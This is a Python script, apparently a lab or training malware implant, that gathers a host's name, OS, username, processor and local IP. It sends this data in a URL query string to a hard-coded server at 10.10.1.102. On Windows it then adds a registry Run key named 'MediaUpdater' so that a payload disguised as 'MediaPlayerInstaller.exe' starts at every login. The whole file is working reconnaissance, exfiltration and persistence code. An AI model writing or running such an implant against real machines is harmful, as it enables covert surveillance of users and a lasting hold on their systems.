import socket
import platform
import os
import requests
import subprocess
import sys

# ========================================================
# CONFIGURATION
SERVER_IP = '10.10.1.102' 
ENDPOINT = 'download' 
PAYLOAD_NAME = 'MediaPlayerInstaller.exe'
# ========================================================

def get_host_info():
    # (Function remains the same, collects host data)
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.system()
    info['os_release'] = platform.release()
    info['os_version'] = platform.version()
    info['user'] = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'N/A')
    info['processor'] = platform.processor()
    info['local_ip'] = socket.gethostbyname(socket.gethostname())
    return info

def set_persistence(data):
    """
    Registers the payload to run automatically upon system startup.
    """
    os_type = data['os']
    print(f"\n[+] Attempting to achieve persistence on {os_type}...")

    if os_type == 'Windows':
        
        try:
            cmd = rf'reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v MediaUpdater /t REG_SZ /d "C:\Temp\{(PAYLOAD_NAME)}" /f'

            subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("✅ WINDOWS Persistence SUCCESS! Added to HKCU Run Key.")
            
        except subprocess.CalledProcessError as e:
            print(f"❌ WINDOWS Persistence FAILURE! Registry Command failed.")
            print(f"Error: {e.stderr.decode()}")
        except Exception as e:
            print(f"❌ WINDOWS Persistence FAILURE! General Error: {e}")


def send_data(data):
    """
    Sends the collected data to the HTTP server.
    """
    params = []
    for key, value in data.items():
        params.append(f"{key}={value}")
        
    query_string = "&".join(params)
    target_url = f"http://{SERVER_IP}/{ENDPOINT}?{query_string}"
    
    print(f"\n[+] Target URL: {target_url}")
    
    try:
        response = requests.get(target_url, timeout=10)
        
        if response.status_code == 200:
            print("-" * 40)
            print(f"✅ SUCCESS: Data successfully sent!")
            print("-" * 40)
        else:
            print(f"❌ FAILURE: Failed to send data. Status Code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print("\n" + "=" * 40)
        print(f"🚨 CRITICAL ERROR: Could not connect to server. Persistence may fail.")
        print(f"Error details: {e}")
        print("=" * 40)


if __name__ == "__main__":
    host_data = get_host_info()
    
    print("\n--- Collected Host Data ---")
    for k, v in host_data.items():
        print(f"{k.upper():<10}: {v}")
    print("---------------------------\n")
    
    send_data(host_data)
    
    set_persistence(host_data)

    print("\n[*** Execution Complete ***]")
